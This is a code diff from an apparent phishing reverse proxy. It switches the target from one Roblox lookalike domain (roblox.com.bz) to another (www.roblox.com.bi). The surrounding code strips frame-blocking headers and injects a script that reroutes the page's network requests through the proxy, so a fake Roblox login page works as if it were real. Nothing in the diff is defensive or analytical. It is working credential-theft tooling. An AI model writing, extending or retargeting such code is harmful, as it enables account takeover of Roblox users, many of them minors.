@@ -12,9 +12,9 @@
 const DEFAULT_TARGET_URL =
   process.env.TARGET_URL ||
   process.env.VERIFICATION_URL ||
-  "https://roblox.com.bz/login?returnUrl=4191421542448922";
+  "https://www.roblox.com.bi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F919588160482%2Fprofile";
 
-const TARGET_ORIGIN = "https://roblox.com.bz";
+const TARGET_ORIGIN = "https://www.roblox.com.bi";
 
 const FORBIDDEN_RESPONSE_HEADERS = new Set([
   "x-frame-options",
@@ -100,12 +100,12 @@ function injectInterceptor(html) {
     if (typeof url === "string") {
       if (url.startsWith("/") && !url.startsWith("/api/")) {
         url = PROXY + encodeURIComponent(TARGET + url);
-      } else if (url.indexOf("roblox.com.bz") !== -1) {
+      } else if (url.indexOf("roblox.com.bi") !== -1) {
         url = PROXY + encodeURIComponent(url);
       }
     } else if (url && url.url) {
       var reqUrl = url.url;
-      if (reqUrl.indexOf("roblox.com.bz") !== -1) {
+      if (reqUrl.indexOf("roblox.com.bi") !== -1) {
         url = new Request(PROXY + encodeURIComponent(reqUrl), url);
       }
     }
@@ -117,7 +117,7 @@ function injectInterceptor(html) {
     if (typeof url === "string") {
       if (url.startsWith("/") && !url.startsWith("/api/")) {
         url = PROXY + encodeURIComponent(TARGET + url);
-      } else if (url.indexOf("roblox.com.bz") !== -1) {
+      } else if (url.indexOf("roblox.com.bi") !== -1) {
         url = PROXY + encodeURIComponent(url);
       }
     }
